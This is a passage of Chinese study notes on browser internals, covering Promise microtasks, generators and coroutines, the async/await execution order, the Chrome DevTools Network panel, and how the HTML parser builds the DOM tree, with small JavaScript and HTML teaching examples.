**其次，需要将回调函数 onResolve 的返回值穿透到最外层**。因为会根据 onResolve 函数的传入值来决定创建什么类型的 Promise 任务，创建好的 Promise 对象需要返回到最外层，这样就可以摆脱嵌套循环了。你可以先看下面的代码：

![image-20220405145529925](.\typora-user-images\image-20220405145529925.png)

**Promise 通过回调函数延迟绑定和回调函数返回值穿透的技术，解决了循环嵌套。**

### Promise 处理异常

Promise 对象的错误具有“冒泡”性质，会一直向后传递，直到被 onReject 函数处理或 catch 语句捕获为止。具备了这样“冒泡”的特性后，就不需要在每个 Promise 对象中单独捕获异常了。

### Promise 与微任务

```js
function executor(resolve, reject) {
  resolve(100);
}
let demo = new Promise(executor);

function onResolve(value) {
  console.log(value);
}
demo.then(onResolve);
```

首先执行 new Promise 时，Promise 的构造函数会被执行，然后在 executor 中执行了 resolve，执行 resolve 函数，会触发 demo.then 设置的回调函数 onResolve，所以可以推测，resolve 函数内部调用了通过 demo.then 设置的 onResolve 函数。

不过这里需要注意一下，由于 Promise 采用了**回调函数延迟绑定技术**，所以在执行 resolve 函数的时候，回调函数还没有绑定，那么只能推迟回调函数的执行。

1、Promise 中为什么要引入微任务？

由于 promise 采用.then 延时绑定回调机制，而 new Promise 时又需要直接执行 promise 中的方法，即发生了先执行方法后添加回调的过程，此时需等待 then 方法绑定两个回调后才能继续执行方法回调，便可将回调添加到当前 js 调用栈中执行结束后的任务队列中，由于宏任务较多容易堵塞，则采用了微任务

2、Promise 中是如何实现回调函数返回值穿透的？

首先 Promise 的执行结果保存在 promise 的 data 变量中，然后是.then 方法返回值为使用 resolved 或 rejected 回调方法新建的一个 promise 对象，即例如成功则返回 new Promise（resolved），将前一个 promise 的 data 值赋给新建的 promise

3、Promise 出错后，是怎么通过“冒泡”传递给最后那个捕获？

promise 内部有 resolved*和 rejected*变量保存成功和失败的回调，进入.then（resolved，rejected）时会判断 rejected 参数是否为函数，若是函数，错误时使用 rejected 处理错误；若不是，则错误时直接 throw 错误，一直传递到最后的捕获，若最后没有被捕获，则会报错。可通过监听 unhandledrejection 事件捕获未处理的 promise 错误

问：异步 AJAX 请求是宏任务吧？Promise 是微任务，那么用 Promise 进行的异步 Ajax 调用时宏任务还是微任务？

答： ajax 就是 xmlhttprequest，必然是宏任务！ 准确地说，**Promise 在执行 resolve 或者 reject 时，触发微任务入队**，所以在 Promise 的 executor 函数中调用 xmlhttprequest 会触发宏任务。 如果 xmlhttprequest 请求成功了，通过 resolve 触发微任务 如果 xmlhttprequest 请求失败了，通过 reject 触发微任务

## async/await

使用 Promise 能解决回调地狱问题，但是这种方式充满了 Promise 的 then() 方法，如果处理流程比较复杂的话，那么整段代码将充斥着 then，语义化不明显，代码不能很好地表示执行流程。

场景：先请求极客邦的内容，等返回信息之后，再请求极客邦的另外一个资源。下面代码展示的是使用 fetch 来实现这样的需求，fetch 被定义在 window 对象中，可以用它来发起对远程资源的请求，该方法返回的是一个 Promise 对象，fetch 是浏览器原生支持的，并有没利用 XMLHttpRequest 来封装。

```js
fetch('https://www.geekbang.org')
  .then((response) => {
    console.log(response);
    return fetch('https://www.geekbang.org/test');
  })
  .then((response) => {
    console.log(response);
  })
  .catch((error) => {
    console.log(error);
  });
```

虽然整个请求流程已经线性化了，但是代码里面包含了大量的 then 函数，太容易阅读。

**基于这个原因，ES7 引入了 async/await，提供了在不阻塞主线程的情况下使用同步代码实现异步访问资源的能力，并且使得代码逻辑更加清晰**。（使用同步编码的方式编写异步逻辑）

```js
async function foo() {
  try {
    let response1 = await fetch('https://www.geekbang.org');
    console.log('response1');
    console.log(response1);
    let response2 = await fetch('https://www.geekbang.org/test');
    console.log('response2');
    console.log(response2);
  } catch (err) {
    console.error(err);
  }
}
foo();
```

整个异步处理的逻辑都是使用同步代码的方式来实现的，而且还支持 try catch 来捕获异常，这就是完全在写同步代码，所以是非常符合人的线性思维的。

习惯了异步回调的编程思维，对于这种采用同步代码实现异步逻辑的方式，还需要一个转换的过程。

**JavaScript 引擎是如何实现 async/await **

生成器（Generator）是如何工作的， Generator 的底层实现机制——协程（Coroutine）；因为 async/await 使用了 Generator 和 Promise 两种技术，所以紧接着我们就通过 Generator 和 Promise 来分析 async/await 到底是如何以同步的方式来编写异步代码的。

生成器的工作原理，生成器底层基于——协程（Coroutine）来实现。

async/await 基于 Generator 和 Promise。

**什么是生成器函数？**

**生成器函数是一个带星号函数，而且是可以暂停执行和恢复执行的**。

```js
function* genDemo() {
  console.log(' 开始执行第一段 ');
  yield 'generator 2';

  console.log(' 开始执行第二段 ');
  yield 'generator 2';

  console.log(' 开始执行第三段 ');
  yield 'generator 2';

  console.log(' 执行结束 ');
  return 'generator 2';
}

console.log('main 0');
let gen = genDemo();
console.log(gen.next().value);
console.log('main 1');
console.log(gen.next().value);
console.log('main 2');
console.log(gen.next().value);
console.log('main 3');
console.log(gen.next().value);
console.log('main 4');
```

函数 genDemo 并不是一次执行完的，全局代码(父协程)和 genDemo 函数（子协程）交替执行。其实这就是生成器函数的特性，可以暂停执行，也可以恢复执行。生成器函数的具体使用方式：

1. 在生成器函数内部执行一段代码，如果遇到 yield 关键字，那么 JavaScript 引擎线程将返回关键字后面的内容给外部（父协程），并暂停该函数的执行。

2. 外部函数（父协程）可以通过 next 方法恢复生成器函数（指定的子协程）的执行。

**JavaScript 引擎 V8 是如何实现一个函数的暂停和恢复的**

要搞懂函数为何能暂停和恢复，那你首先要了解协程的概念。**协程是一种比线程更加轻量级的存在**。你可以把协程看成是跑在线程上的任务，一个线程上可以存在多个协程，但是在线程上同时只能执行一个协程，比如当前执行的是 A 协程，要启动 B 协程，那么 A 协程就需要将主线程的控制权交给 B 协程，这就体现在 A 协程暂停执行，B 协程恢复执行；同样，也可以从 B 协程中启动 A 协程。通常，**如果从 A 协程启动 B 协程，我们就把 A 协程称为 B 协程的父协程**。

**正如一个进程可以拥有多个线程一样，一个线程也可以拥有多个协程。**最重要的是，**协程不是被操作系统内核所管理，而完全是由程序所控制（也就是在用户态执行）。这样带来的好处就是性能得到了很大的提升，不会像线程切换那样消耗资源。**

结合上面那段代码的执行过程，画出了下面的“协程执行流程图”：

![image-20220405153051514](.\typora-user-images\image-20220405153051514.png)

从图中可以看出来协程的四点规则：

1. **通过调用生成器函数 genDemo 来创建一个协程 gen，创建之后，gen 协程并没有立即执行。**
2. **要让 gen 协程执行，需要通过调用 gen.next。**
3. **当协程正在执行的时候，可以通过 yield 关键字来暂停 gen 协程的执行，并返回主要信息给父协程。**
4. **如果协程在执行期间，遇到了 return 关键字，那么 JavaScript 引擎会结束当前协程，并将 return 后面的内容返回给父协程。**

父协程有自己的调用栈，gen 协程时也有自己的调用栈，当 gen 协程通过 yield 把控制权交给父协程时，V8 是如何切换到父协程的调用栈？当父协程通过 gen.next 恢复 gen 协程时，又是如何切换 gen 协程的调用栈？

要搞清楚上面的问题，你需要关注以下两点内容。

第一点：**gen 协程和父协程是在主线程上交互执行的，并不是并发执行的，它们之前的切换是通过 yield 和 gen.next 来配合完成的。**

第二点：**当在 gen 协程中调用了 yield 方法时，JavaScript 引擎会保存 gen 协程当前的调用栈信息，并恢复父协程的调用栈信息。同样，当在父协程中执行 gen.next 时，JavaScript 引擎会保存父协程的调用栈信息，并恢复 gen 协程的调用栈信息。**

父协程和 gen 协程是如何切换调用栈的，可以参考下图：

![image-20220405154008981](.\typora-user-images\image-20220405154008981.png)

在 JavaScript 中，生成器就是协程的一种实现方式，那么接下来，使用生成器和 Promise 来改造开头的那段 Promise 代码。改造后的代码如下所示：

```js
//foo 函数
function* foo() {
  let response1 = yield fetch('https://www.geekbang.org');
  console.log('response1');
  console.log(response1);
  let response2 = yield fetch('https://www.geekbang.org/test');
  console.log('response2');
  console.log(response2);
}

// 执行 foo 函数的代码
let gen = foo();
function getGenPromise(gen) {
  return gen.next().value;
}
getGenPromise(gen)
  .then((response) => {
    console.log('response1');
    console.log(response);
    return getGenPromise(gen);
  })
  .then((response) => {
    console.log('response2');
    console.log(response);
  });
```

从图中可以看到，foo 函数是一个生成器函数，在 foo 函数里面实现了用同步代码形式来实现异步操作；但是在 foo 函数外部，我们还需要写一段执行 foo 函数的代码，如上述代码的后半部分所示，那下面我们就来分析下这段代码是如何工作的。

- 首先执行的是`let gen = foo()`，创建了 gen 协程。
- 然后在父协程中通过执行 gen.next 把主线程的控制权交给 gen 协程。
- gen 协程获取到主线程的控制权后，就调用 fetch 函数创建了一个 Promise 对象 response1，然后通过 yield 暂停 gen 协程的执行，并将 response1 返回给父协程。
- 父协程恢复执行后，调用 response1.then 方法等待请求结果。
- 等通过 fetch 发起的请求完成之后，会调用 then 中的回调函数，then 中的回调函数拿到结果之后，通过调用 gen.next 放弃主线程的控制权，将控制权交 gen 协程继续执行下个请求。

以上就是协程和 Promise 相互配合执行的一个大致流程。不过通常，我们把执行生成器的代码封装成一个函数，并把这个执行生成器代码的函数称为**执行器**（可参考著名的 co 框架），如下面这种方式：

```js
function* foo() {
  let response1 = yield fetch('https://www.geekbang.org');
  console.log('response1');
  console.log(response1);
  let response2 = yield fetch('https://www.geekbang.org/test');
  console.log('response2');
  console.log(response2);
}
co(foo());
```

通过使用生成器配合执行器，就能实现使用同步的方式写出异步代码了，这样也大大加强了代码的可读性。

**async/await**

async/await 技术背后就是 Promise 和生成器应用，往低层说就是微任务和协程应用。要搞清楚 async 和 await 的工作原理，我们就得对 async 和 await 分开分析。

**async**

async 是一个通过**异步执行**并**隐式返回 Promise** 作为结果的函数。

```js
async function foo() {
  return 2;
}
console.log(foo()); // Promise {<resolved>: 2}
```

**await**

```js
async function foo() {
  console.log(1);
  let a = await 100;
  console.log(a);
  console.log(2);
}
console.log(0);
foo();
console.log(3);
```

判断出打印出来的内容是什么吗？这得先来分析 async 结合 await 到底会发生什么。在详细介绍之前，我们先站在协程的视角来看看这段代码的整体执行流程图：

![image-20220405155432371](.\typora-user-images\image-20220405155432371.png)

结合上图，我们来一起分析下 async/await 的执行流程。

首先，执行`console.log(0)`这个语句，打印出来 0。

紧接着就是执行 foo 函数，由于 foo 函数是被 async 标记过的，所以当进入该函数的时候，JavaScript 引擎会保存当前的调用栈等信息，然后执行 foo 函数中的`console.log(1)`语句，并打印出 1。

接下来就执行到 foo 函数中的`await 100`这个语句了，这里是我们分析的重点，因为在执行`await 100`这个语句时，JavaScript 引擎在背后为我们默默做了太多的事情，那么下面我们就把这个语句拆开，来看看 JavaScript 到底都做了哪些事情。

当执行到`await 100`时，会默认创建一个 Promise 对象，代码如下所示：

```js
let promise_ = new Promise((resolve,reject){
  resolve(100)
})
```

在这个 promise\_ 对象创建的过程中，我们可以看到在 executor 函数中调用了 resolve 函数，JavaScript 引擎会将该任务提交给微任务队列。

然后 JavaScript 引擎会暂停当前协程的执行，将主线程的控制权转交给父协程执行，同时会将 promise\_ 对象返回给父协程。

主线程的控制权已经交给父协程了，这时候父协程要做的一件事是调用 promise\_.then 来监控 promise 状态的改变。

接下来继续执行父协程的流程，这里我们执行`console.log(3)`，并打印出来 3。随后父协程将执行结束，在结束之前，会进入微任务的检查点，然后执行微任务队列，微任务队列中有`resolve(100)`的任务等待执行，执行到这里的时候，会触发 promise\_.then 中的回调函数，如下所示：

```js
promise_.then((value) => {
  // 回调函数被激活后
  // 将主线程控制权交给 foo 协程，并将 vaule 值传给协程
});
```

该回调函数被激活以后，会将主线程的控制权交给 foo 函数的协程，并同时将 value 值传给该协程。

foo 协程激活之后，会把刚才的 value 值赋给了变量 a，然后 foo 协程继续执行后续语句，执行完成之后，将控制权归还给父协程。

以上就是 await/async 的执行流程。正是因为 async 和 await 在背后为我们做了大量的工作，所以我们才能用同步的方式写出异步代码来。

```js
async function foo() {
  console.log('foo');
}
async function bar() {
  console.log('bar start');
  await foo();
  console.log('bar end');
}
console.log('script start');
setTimeout(function () {
  console.log('setTimeout');
}, 0);
bar();
new Promise(function (resolve) {
  console.log('promise executor');
  resolve();
}).then(function () {
  console.log('promise then');
});
console.log('script end');
```

答：

> 1.首先执行 console.log('script start');打印出 script start
>
> 2.接着遇到定时器，创建一个新任务，放在延迟队列中
>
> 3.紧接着执行 bar 函数，由于 bar 函数被 async 标记的，所以进入该函数时，JS 引擎会保存当前调用栈等信息，然后执行 bar 函数中的 console.log('bar start');语句，打印 bar start。
>
> 4.接下来执行到 bar 函数中的 await foo();语句，执行 foo 函数，也由于 foo 函数被 async 标记的，所以进入该函数时，JS 引擎会保存当前调用栈等信息，然后执行 foo 函数中的 console.log('foo');语句，打印 foo。
>
> 5.执行到 await foo()时，会默认创建一个 Promise 对象
>
> 6.在创建 Promise 对象过程中，调用了 resolve()函数，且 JS 引擎将该任务交给微任务队列
>
> 7.然后 JS 引擎会暂停当前协程的执行，将主线程的控制权交给父协程，同时将创建的 Promise 对象返回给父协程
>
> 8.主线程的控制权交给父协程后，父协程就调用该 Promise 对象的 then()方法监控该 Promise 对象的状态改变
>
> 9.接下来继续父协程的流程，执行 new Promise()，打印输出 promise executor，其中调用了 resolve 函数，JS 引擎将该任务添加到微任务队列队尾
>
> 10.继续执行父协程上的流程，执行 console.log('script end');，打印出来 script end
>
> 11.随后父协程将执行结束，在结束前，会进入微任务检查点，然后执行微任务队列，微任务队列中有两个微任务等待执行，先执行第一个微任务，触发第一个 promise.then()中的回调函数，将主线程的控制权交给 bar 函数的协程，bar 函数的协程激活后，继续执行后续语句，执行 console.log('bar end');，打印输出 bar end
>
> 12.bar 函数协程执行完成后，执行微任务队列中的第二个微任务，触发第二个 promise.then()中的回调函数，该回调函数被激活后，执行 console.log('promise then');，打印输出 promise then
>
> 13.执行完之后，将控制权归还给主线程，当前任务执行完毕，取出延迟队列中的任务，执行 console.log('setTimeout');打印输出 setTimeout。
>
> 故：最终输出顺序是：script start => bar start => foo => promise executor => script end => bar end => promise then => setTimeout

浏览器的渲染进程中的主线程的页面任务循环系统和 JavaScript 引擎线程中的事件循环系统是不同的概念。

页面循环系统包括的过程包括：DOM 解析，CSS 解析，样式计算，布局，分层，JavaScript 执行等过程。

## Chrome 开发者工具

**Chrome 开发者工具（简称 DevTools）是一组工具，用于网页制作和调试，内嵌于 Google Chrome 浏览器中**。

**页面的源头**和**网络数据的接收**

**网络面板**

与性能相关的有：

- 网络面板
- Performance 面板
- 内存面板等

与调试页面相关的有：

- Elements 面板
- Sources 面板
- Console 面板等

F12 快速打开开发者工具。

![image-20220411221028191](.\typora-user-images\image-20220411221028191.png)

它一共包含了 10 个功能面板，包括了 Elements、Console、Sources、NetWork、Performance、Memory、Application、Security、Audits 和 Layers。

Element 面板：查看 DOM 结构，编辑 CSS 样式，调试页面的布局和设计页面

Console 面板：类似 Javascript Shell，可以执行 js，console 等输出语句或者通过代码和页面进行交互

Sources 面板：

- 查看 web 应用加载的所有文件
- 编辑 CSS 和 JS 文件内容
- 将打乱的 CSS 和 JS 文件格式化
- 支持 JS 的调试功能
- 设置工作区，将改变后的文件保存到本地文件夹中

NetWork 面板：展示页面中所有的请求内容列表，能查看每一项请求的请求，响应报文，时间线以及网络请求中的瀑布图等

Performance 面板：记录和查看 web 应用生命周期内的各种事件，并用来分析在执行过程中一些影响性能的点

Memory 面板：查看允许过程中 JS 占用堆内存的情况，追踪是否存在内存泄漏的情况

Application 面板：查看 web 应用的数据存储情况，PWA 的基础数据。indexDB，WebSQL，本地和会话存储，Cookie，应用程序缓存，图像，字体和样式表等

Security 面板：显示当前页面的一些基础的安全信息

Audits 面板：对当前页面进行网络利用情况，网页性能方面的诊断，并给出一些优化建议

Layers 面板：展示一些渲染过程中分层的基础信息

### 网络面板

网络面板由控制器、过滤器、抓图信息、时间线、详细列表和下载信息概要这 6 个区域构成（如下图所示）。

![image-20220411221759509](.\typora-user-images\image-20220411221759509.png)

#### 1. 控制器

![image-20220411221847877](.\typora-user-images\image-20220411221847877.png)

- 红色圆点的按钮，表示“开始 / 暂停抓包”。

- “全局搜索”按钮，可以在所有下载资源中搜索相关内容，还可以快速定位到某几个想要的文件上。

- Disable cache，即“禁止从 Cache 中加载资源”的功能，它在调试 Web 应用的时候非常有用，因为开启了 Cache 会影响到网络性能测试的结果。

- Online 按钮，是“模拟 2G/3G”功能，它可以限制带宽，模拟弱网情况下页面的展现情况，然后你就可以根据实际展示情况来动态调整策略，以便让 Web 应用更加适用于这些弱网。

#### 2. 过滤器

主要就是起过滤功能。有时候一个页面有太多内容在详细列表区域中展示，而可能只想查看 JavaScript 文件或者 CSS 文件，这时候就可以通过过滤器模块来筛选想要的文件类型。

#### 3. 抓图信息

抓图信息区域，可以用来分析用户等待页面加载时间内所看到的内容，分析用户实际的体验情况。比如，如果页面加载 1 秒多之后屏幕截图还是白屏状态，这时候就需要分析是网络还是代码的问题了。（勾选面板上的“Capture screenshots”即可启用屏幕截图。）

#### 4. 时间线

时间线，主要用来展示 HTTP、HTTPS、WebSocket 加载的状态和时间的一个关系，用于直观感受页面的加载过程。**如果是多条竖线堆叠在一起，那说明这些资源被同时被加载。**至于具体到每个文件的加载信息，还需要用到下面要讲的详细列表。

![image-20220411222415337](.\typora-user-images\image-20220411222415337.png)

#### 5. 详细列表

**它详细记录了每个资源从发起请求到完成请求这中间所有过程的状态，以及最终请求完成的数据信息。**通过该列表，能很容易地去诊断一些网络问题。

#### 6. 下载信息概要

下载信息概要中，要重点关注下 DOMContentLoaded 和 Load 两个事件，以及这两个事件的完成时间。

- DOMContentLoaded，这个事件发生后，说明页面已经构建好 DOM 了，这意味着构建 DOM 所需要的 HTML 文件、JavaScript 文件、CSS 文件都已经下载完成了。
- Load，说明浏览器已经加载了所有的资源（图像、样式表等）。

通过下载信息概要面板，你可以查看触发这两个事件所花费的时间。

### 网络面板详细列表

#### 1. 列表的属性

列表的属性比较多，比如 Name、Status、Type、Initiator 等等，这个不难理解。可以通过点击右键的下拉菜单来添加其他属性。

可以按照列表的属性来给列表排序，默认情况下，列表是按请求发起的时间来排序的，最早发起请求的资源在顶部。当然也可以按照返回状态码、请求类型、请求时长、内容大小等基础属性排序，只需点击相应属性即可。

![image-20220411222818763](.\typora-user-images\image-20220411222818763.png)

#### 2. 详细信息

如果选中详细列表中的一项，右边就会出现该项的详细信息，如下所示：

![image-20220411222847394](.\typora-user-images\image-20220411222847394.png)

可以在此查看请求列表中任意一项的请求行和请求头信息，还可以查看响应行、响应头和响应体。然后你可以根据这些查看的信息来判断业务逻辑是否正确，或者有时候也可以用来逆向推导别人网站的业务逻辑。

#### 3. 单个资源的时间线

单个资源请求时间线，这就涉及具体的 HTTP 请求流程。

![image-20220411223013428](.\typora-user-images\image-20220411223013428.png)

发起一个 HTTP 请求之后，浏览器首先查找缓存，如果缓存没有命中，那么继续发起 DNS 请求获取 IP 地址，然后利用 IP 地址和服务器端建立 TCP 连接，再发送 HTTP 请求，等待服务器响应；不过，如果服务器响应头中包含了重定向的信息，那么整个流程就需要重新再走一遍。这就是在浏览器中一个 HTTP 请求的基础流程。

时间线列表中是如何表示出这个流程的呢？这就要重点看下时间线面板了：

![image-20220411223115430](.\typora-user-images\image-20220411223115430.png)

**第一个是 Queuing**，也就是排队的意思，当浏览器发起一个请求的时候，会有很多原因导致该请求不能被立即执行，而是需要排队等待。导致请求处于排队状态的原因有很多。

- 首先，页面中的资源是有优先级的，比如 CSS、HTML、JavaScript 等都是页面中的核心文件，所以优先级最高；而图片、视频、音频这类资源就不是核心资源，优先级就比较低。通常当后者遇到前者时，就需要“让路”，进入待排队状态。
- 其次，浏览器会为每个域名最多维护 6 个 TCP 连接，如果发起一个 HTTP 请求时，这 6 个 TCP 连接都处于忙碌状态，那么这个请求就会处于排队状态。
- 最后，网络进程在为数据分配磁盘空间时，新的 HTTP 请求也需要短暂地等待磁盘分配结束。

等待排队完成之后，就要进入发起连接的状态了。不过在发起连接之前，还有一些原因可能导致连接过程被推迟，这个推迟就表现在面板中的**Stalled**上，它表示停滞的意思。

这里需要额外说明的是，如果你使用了代理服务器，还会增加一个**Proxy Negotiation**阶段，也就是代理协商阶段，它表示代理服务器连接协商所用的时间，不过在上图中没有体现出来，因为这里我们没有使用代理服务器。

接下来，就到了**Initial connection/SSL 阶段**了，也就是和服务器建立连接的阶段，这包括了建立 TCP 连接所花费的时间；不过如果你使用了 HTTPS 协议，那么还需要一个额外的 SSL 握手时间，这个过程主要是用来协商一些加密信息的。

和服务器建立好连接之后，网络进程会准备请求数据，并将其发送给网络，这就是**Request sent 阶段**。通常这个阶段非常快，因为只需要把浏览器缓冲区的数据发送出去就结束了，并不需要判断服务器是否接收到了，所以这个时间通常不到 1 毫秒。

数据发送出去了，接下来就是等待接收服务器第一个字节的数据，这个阶段称为 Waiting (TTFB)，通常也称为“**第一字节时间**”。 TTFB 是反映服务端响应速度的重要指标，对服务器来说，TTFB 时间越短，就说明服务器响应越快。

接收到第一个字节之后，进入陆续接收完整数据的阶段，也就是**Content Download 阶段**，这意味着从第一字节时间到接收到全部响应数据所用的时间。

### 优化时间线上耗时项 DOM 树

了解了时间线面板上的各项含义之后，我们就可以根据这个请求的时间线来实现相关的优化操作了。

#### 1. 排队（Queuing）时间过久

排队时间过久，大概率是由浏览器为每个域名最多维护 6 个连接导致的。那么基于这个原因，你就可以让 1 个站点下面的资源放在多个域名下面，比如放到 3 个域名下面，这样就可以同时支持 18 个连接了，这种方案称为**域名分片**技术。除了域名分片技术外，我个人还建议你**把站点升级到 HTTP2**，因为 HTTP2 已经没有每个域名最多维护 6 个 TCP 连接的限制了。

#### 2. 第一字节时间（TTFB）时间过久

这可能的原因有如下：

- **服务器生成页面数据的时间过久**。对于动态网页来说，服务器收到用户打开一个页面的请求时，首先要从数据库中读取该页面需要的数据，然后把这些数据传入到模板中，模板渲染后，再返回给用户。服务器在处理这个数据的过程中，可能某个环节会出问题。
- **网络的原因**。比如使用了低带宽的服务器，或者本来用的是电信的服务器，可联通的网络用户要来访问你的服务器，这样也会拖慢网速。
- **发送请求头时带上了多余的用户信息**。比如一些不必要的 Cookie 信息，服务器接收到这些 Cookie 信息之后可能需要对每一项都做处理，这样就加大了服务器的处理时长。

对于这三种问题，你要有针对性地出一些解决方案。面对第一种服务器的问题，你可以想办法去提高服务器的处理速度，比如通过增加各种缓存的技术；针对第二种网络问题，你可以使用 CDN 来缓存一些静态文件；至于第三种，你在发送请求时就去尽可能地减少一些不必要的 Cookie 数据信息。

#### 3. Content Download 时间过久

如果单个请求的 Content Download 花费了大量时间，有可能是字节数太多的原因导致的。这时候你就需要减少文件大小，比如压缩、去掉源码中不必要的注释等方法。

问题：你可以结合网络面板和 Performance 面板来分析一个 Web 应用的性能瓶颈（比如[https://www.12306.cn](https://www.12306.cn/index/) ）

## Performance 面板

自行上网总结。

## DOM 树

### 什么是 DOM

网络进程传给渲染进程的 HTML 文件字节流是无法直接被渲染引擎理解的，所以要将其转化为渲染引擎能够理解的内部结构，这个结构就是 DOM。DOM 是对 HTML 文档结构化的表述。在渲染引擎中，DOM 有三个层面的作用。

- 从页面的来看，DOM 是生成页面的基础数据结构。
- 从 JavaScript 脚本来看，DOM 提供给 JavaScript 脚本操作的接口，通过这套接口，JavaScript 可以对 DOM 结构进行访问，从而改变文档的结构、样式和内容。
- 从安全来看，DOM 是一道安全防护线，一些不安全的内容在 DOM 解析阶段就被拒之门外。

### DOM 树是怎么生成的

在渲染引擎内部，有一个叫**HTML 解析器（HTMLParser）**的模块，它的职责就是负责将 HTML 字节流转换为 DOM 结构。

**HTML 解析器是等整个 HTML 文档加载完成之后开始解析的，还是随着 HTML 文档边加载边解析的？**

HTML 解析器并不是等整个文档加载完成之后再解析的，而是**网络进程加载了多少数据，HTML 解析器便解析多少数据**。

网络进程接收到响应头之后，将响应头，行信息传输给浏览器进程，浏览器进程会根据响应头中的 content-type 字段来判断文件的类型，比如 content-type 的值是“text/html”，那么浏览器进程就会判断这是一个 HTML 类型的文件，然后为该请求选择或者创建一个渲染进程。并‘提交文档’给渲染进程，渲染进程准备好之后，**网络进程和渲染进程之间会建立一个共享数据的管道**，网络进程接收到数据后就往这个管道里面放，而渲染进程则从管道的另外一端不断地读取数据，并同时将读取的数据给 HTML 解析器。

HTML 解析器是怎么工作的。字节流是如何转换为 DOM 的？

![image-20220411232445873](.\typora-user-images\image-20220411232445873.png)

字节流转换为 DOM 需要三个阶段

**第一个阶段，通过分词器将字节流转换为 Token。**

V8 编译 JavaScript 过程中的第一步是做词法分析，将 JavaScript 先分解为一个个 Token。解析 HTML 也是一样的，需要通过分词器先将字节流转换为一个个 Token，分为 Tag Token 和文本 Token。上述 HTML 代码通过词法分析生成的 Token 如下所示：

![image-20220411232604270](.\typora-user-images\image-20220411232604270.png)

由图可以看出，Tag Token 又分 StartTag 和 EndTag，比如`<body>`就是 StartTag ，`</body>就是EndTag`，分别对应图中的蓝色和红色块，文本 Token 对应的绿色块。

**至于后续的第二个和第三个阶段是同步进行的，需要将 Token 解析为 DOM 节点，并将 DOM 节点添加到 DOM 树中。**

HTML 解析器维护了一个**Token 栈结构**，该 Token 栈主要用来计算节点之间的父子关系，在第一个阶段中生成的 Token 会被按照顺序压到这个栈中。具体的处理规则如下所示：

- 如果压入到栈中的是**StartTag Token**，HTML 解析器会为该 Token 创建一个 DOM 节点，然后将该节点加入到 DOM 树中，它的父节点就是栈中相邻的那个元素生成的节点。
- 如果分词器解析出来是**文本 Token**，那么会生成一个文本节点，然后将该节点加入到 DOM 树中，文本 Token 是不需要压入到栈中，它的父节点就是当前栈顶 Token 所对应的 DOM 节点。
- 如果分词器解析出来的是**EndTag 标签**，比如是 EndTag div，HTML 解析器会查看 Token 栈顶的元素是否是 StarTag div，如果是，就将 StartTag div 从栈中弹出，表示该 div 元素解析完成。

通过分词器产生的新 Token 就这样不停地压栈和出栈，整个解析过程就这样一直持续下去，直到分词器将所有字节流分词完成。

为了更加直观地理解整个过程，下面结合一段 HTML 代码（如下），来一步步分析 DOM 树的生成过程。

```html
<html>
  <body>
    <div>1</div>
    <div>test</div>
  </body>
</html>
```

这段代码以字节流的形式传给了 HTML 解析器，经过分词器处理，解析出来的第一个 Token 是 StartTag html，解析出来的 Token 会被压入到栈中，并同时创建一个 html 的 DOM 节点，将其加入到 DOM 树中。

这里需要补充说明下，**HTML 解析器开始工作时，会默认创建了一个根为 document 的空 DOM 结构**，同时会将一个 StartTag document 的 Token 压入栈底。然后经过分词器解析出来的第一个 StartTag html Token 会被压入到栈中，并创建一个 html 的 DOM 节点，添加到 document 上，如下图所示：

![image-20220411232823709](.\typora-user-images\image-20220411232823709.png)

然后按照同样的流程解析出来 StartTag body 和 StartTag div，其 Token 栈和 DOM 的状态如下图所示：

![image-20220411232840394](.\typora-user-images\image-20220411232840394.png)

接下来解析出来的是第一个 div 的文本 Token，渲染引擎会为该 Token 创建一个文本节点，并将该 Token 添加到 DOM 中，它的父节点就是当前 Token 栈顶元素对应的节点，如下图所示：

![image-20220411232746149](.\typora-user-images\image-20220411232746149.png)

再接下来，分词器解析出来第一个 EndTag div，这时候 HTML 解析器会去判断当前栈顶的元素是否是 StartTag div，如果是则从栈顶弹出 StartTag div，如下图所示：

![image-20220411232906261](.\typora-user-images\image-20220411232906261.png)

按照同样的规则，一路解析，最终结果如下图所示：

![image-20220411232928851](.\typora-user-images\image-20220411232928851.png)

### JS 影响 DOM 生成

```html
<html>
  <body>
    <div>1</div>
    <script>
      let div1 = document.getElementsByTagName('div')[0];
      div1.innerText = 'time.geekbang';
    </script>
    <div>test</div>
  </body>
</html>
```

`<script>标签之前，所有的解析流程还是和之前介绍的一样，但是解析到<script>标签时，渲染引擎判断这是一段脚本，此时 HTML 解析器就会暂停 DOM 的解析，因为接下来的 JavaScript 可能要修改当前已经生成的 DOM 结构。`

通过前面 DOM 生成流程分析，我们已经知道当解析到 script 脚本标签时，其 DOM 树结构如下所示：

![image-20220411233116357](.\typora-user-images\image-20220411233116357.png)

这时候 HTML 解析器暂停工作，JavaScript 引擎介入，并执行 script 标签中的这段脚本，因为这段 JavaScript 脚本修改了 DOM 中第一个 div 中的内容，所以执行这段脚本之后，div 节点内容已经修改为 time.geekbang 了。脚本执行完成之后，HTML 解析器恢复解析过程，继续解析后续的内容，直至生成最终的 DOM。

除了在页面中直接内嵌 JavaScript 脚本之外，我们还通常需要在页面中引入 JavaScript 文件。

执行到 JavaScript 标签时，暂停整个 DOM 的解析，执行 JavaScript 代码，不过这里执行 JavaScript 时，需要先下载这段 JavaScript 代码。这里需要重点关注下载环境，因为**JavaScript 文件的下载过程会阻塞 DOM 解析**，而通常下载又是非常耗时的，会受到网络环境、JavaScript 文件大小等因素的影响。

不过 Chrome 浏览器做了很多优化，其中一个主要的优化是**预解析操作**。当渲染引擎收到字节流之后，会开启一个预解析线程，用来分析 HTML 文件中包含的 JavaScript、CSS 等相关文件，解析到相关文件之后，预解析线程会提前下载这些文件。

再回到 DOM 解析上，我们知道引入 JavaScript 线程会阻塞 DOM，不过也有一些相关的策略来规避，比如使用 CDN 来加速 JavaScript 文件的加载，压缩 JavaScript 文件的体积。另外，如果 JavaScript 文件中没有操作 DOM 相关代码，就可以将该 JavaScript 脚本设置为异步加载，通过 async 或 defer 来标记代码。

async 和 defer 虽然都是异步的，不过还有一些差异，使用 async 标志的脚本文件一旦加载完成，会立即执行；而使用了 defer 标记的脚本文件，需要在 DOMContentLoaded 事件之前执行。

```css
//theme.css
div {
  color: blue;
}
```

```html
<html>
  <head>
    <style src="theme.css"></style>
  </head>
  <body>
    <div>1</div>
    <script>
      let div1 = document.getElementsByTagName('div')[0];
      div1.innerText = 'time.geekbang'; // 需要 DOM
      div1.style.color = 'red'; // 需要 CSSOM
    </script>
    <div>test</div>
  </body>
</html>
```

